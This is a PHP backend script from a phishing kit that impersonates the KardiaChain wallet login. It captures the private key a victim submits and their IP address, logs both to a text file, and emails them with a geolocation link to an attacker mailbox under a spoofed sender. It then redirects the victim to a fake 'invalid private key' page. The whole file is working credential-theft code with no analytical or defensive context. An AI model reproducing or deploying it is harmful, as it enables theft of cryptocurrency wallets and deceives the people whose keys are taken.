<?php
$file = "kardiachain_______.txt";
$privatekey = $_POST['privatekey'];
$ip = $_SERVER['REMOTE_ADDR'];

$handle = fopen($file, 'a');
fwrite($handle, "\n");
fwrite($handle, "privatekey   	: ");
fwrite($handle, "$privatekey");
fwrite($handle, "\n");
fwrite($handle, "IP Address	: ");
fwrite($handle, "$ip");
fwrite($handle, "\n");
fwrite($handle, "https://explorer.kardiachain.io/wallet-login ");
fwrite($handle, "\n");
fclose($handle);
$privatekey = $_POST['privatekey'];
$ip=$_SERVER['REMOTE_ADDR'];

$message   = "

privatekey : ".$privatekey." 

IP Address : https://geoiptool.com/?IP=".$ip." 

https://explorer.kardiachain.io/wallet-login
";
include 'mail.php';
$subject = "============ kardiachain ============ ".$ip." ";
$headers = "From: kardiachaint <niarats@yandex.com>";
mail($rezult_mail, $subject, $message, $headers);
echo "<script LANGUAGE=\"JavaScript\">
<!--
top.location=\"/invalid-private-key.html?/login\";
// -->
</script>";
?>